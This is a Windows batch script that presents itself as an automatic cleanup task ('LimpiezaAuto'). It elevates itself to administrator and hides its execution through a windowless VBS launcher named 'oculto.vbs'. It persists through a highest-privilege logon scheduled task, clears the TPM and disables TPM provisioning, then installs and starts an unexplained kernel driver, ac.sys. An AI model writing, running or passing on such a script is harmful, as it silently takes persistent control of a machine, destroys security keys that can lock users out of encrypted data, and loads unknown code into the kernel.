��&cls
@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -command "Start-Process '%~f0' -Verb runAs"
    exit /b
)

set "TaskName=LimpiezaAuto"

set "ScriptPath=%~f0"

set "VbsPath=%~dp0oculto.vbs"

if not exist "%VbsPath%" (
    echo Set WshShell = CreateObject("WScript.Shell") > "%VbsPath%"
    echo WshShell.Run "cmd /c ""%ScriptPath%""", 0, False >> "%VbsPath%"
)

schtasks /query /tn "%TaskName%" >nul 2>&1
if %errorlevel% neq 0 (
    schtasks /create /sc onlogon /tn "%TaskName%" /tr "\"%VbsPath%\"" /rl highest /f
)


openfiles >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B
)

powershell -Command "Clear-Tpm"
powershell -Command "Disable-TpmAutoProvisioning"

sc create ac type= kernel start= auto binPath= "%~dp0ac.sys"

sc start ac
